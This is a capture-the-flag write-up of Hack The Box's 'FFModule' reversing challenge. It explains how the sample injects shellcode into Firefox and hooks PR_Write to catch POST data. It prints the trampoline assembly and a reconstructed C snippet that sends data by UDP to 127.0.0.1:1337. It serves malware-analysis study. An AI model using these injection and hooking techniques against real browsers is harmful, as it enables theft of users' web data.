
# "FFModule" by Hack The Box

It's always fun to solve a challenge without even running a binary file. Sometimes this is necessary because either you don't have the required hardware, OS, or library, or because the challenge has bugs and doesn't work. This crackme is an example of the latter: with my current configuration of Windows 11 + Firefox 124.0.1 it just crashed (of course, if you disable Windows Defender first, otherwise it will be killed beforehand). But in this case, it is enough to use only a disassembler.

This crackme is a classic example of how to inject malicious code into a process, and in particular, an example of how Firefox can be used as a target to steal any data. Again, the problem is that this is a “classic” and an “example”, so it will not work if any mediocre antivirus is installed.

But let’s start from the very beginning: firstly, the injection code itself is “hidden”, so, at the first stage, crackme will “decrypt” the required code and run it. To see this, let's simply execute the following IDC script in IDA:

```c
auto  i,  x;
for  (i  =  get_screen_ea();  i  <  get_screen_ea()  +  0x5A4;  i  =  i  +  1)  {
    x  =  byte(i);
    patch_byte(i,  x  ^  0x72);
}
```

The injection code didn't look too fancy: it iterates through the list of currently running processes and, if its EXE file name is `firefox.exe`, it allocates executable memory in that process, copies the code of the next step code into it, and starts a new thread inside that process which executes this code.

The goal of the second stage is to inject the trampoline into the [Firefox's NSPR](https://firefox-source-docs.mozilla.org/nspr/reference/pr_write.html) `PR_Write` function, which is used to write data to a file descriptor. To do this correctly, the following steps are needed:

1. Firstly, the shellcode (or how should I call it now?) finds the address of the `GetProcAddress` function using the “PEB technique” described everywhere and by everyone, so I won't describe it here again.
2. It then finds the addresses of the `VirtualAlloc` and `VirtualProtect` functions and allocates executable memory to store the part of the original `PR_Write` function that it will modify later.
3. The next step is to find one of the loaded libraries that Firefox uses that contains the `PR_Write` function: the shellcode checks the file `nss3.dll` and two others that I don't know about because it uses the CRC32C value of the filename instead of the raw string. I'm guessing the second one should be `nspr4.dll`, but the hash is different, so that's still a question for me.
4. It gets the address of the `PR_Write` function and copies part of the function into the memory allocated in the second step. What's interesting is that the shellcode copies the required number of bytes until it finds the following byte sequence: `0x003300730073006E`, which (I assume) is the UTF16 string "nss3". Honestly, I don't know why it wouldn't use the exact size here, but it is what it is.
5. The last step is to set the memory protection bits and install the following trampoline:

```assembly
push	r13
push	r12
movabs	r12, PR_write_hook
movabs	r13, unmodified_PR_Write
jmp		r12
int3
```

The third stage is the `PR_write_hook` itself, which fires every time the original function is called. First of all, it checks that the size of the data being sent is at least 5 bytes, and the first four bytes in the sending buffer are `POST`. If so, then the following magic happens:

1. It finds the address of the `GetProcAddress` function using the same code that was used in the second stage.
2. Then, again using the same technique, the shellcode finds the necessary libraries and addresses of the following functions: `WSAStartup`, `socket`, `sendto`, `closesocket` and `WSACleanup`.
3. After the initial preparation (roughly speaking, because this preparation and the logic itself are mixed), the following code is executed:

```c
unsigned char sockaddr[] = {0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01, 0xa0, 0x20};
const char* flag = decrypt_flag(); 
 
WSAStartup(0x202, &wsaData);
SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
sendto(s, flag, 0x20, 0, (SOCKADDR *) sockaddr, sizeof (sockaddr));
closesocket(s);
WSACleanup();
```

To avoid the hassle of deciphering the "host" and "network" byte order, I used the following code to see the destination:

```c
struct sockaddr_in *sin = (struct sockaddr_in *) buffer;
char ip[INET_ADDRSTRLEN];
uint16_t port;

inet_ntop (AF_INET, &sin->sin_addr, ip, sizeof (ip));
port = htons (sin->sin_port);

printf ("%s:%d\n", ip, port);
```

this gave me `127.0.0.1:1337` as a result. So, last question: what is this flag? I would probably cheat at this point and use Wireshark to see it, but as I said at the beginning, in my case, the crackme crashed my Firefox, so I'll have to decrypt it manually. Luckily there was no rocket science, and the following IDC script will do the trick:

```c
auto i, x;

for (i = get_screen_ea(); i < get_screen_ea() + 0x20; i = i + 1) {
	x = byte(i);
	x = rotate_byte(x - 0x13, 3);
	patch_byte(i, x ^ 0x42);
}
```

Sometimes a good disassembler is the only tool you need.

The challenge can be found [here](https://app.hackthebox.com/challenges/FFModule).
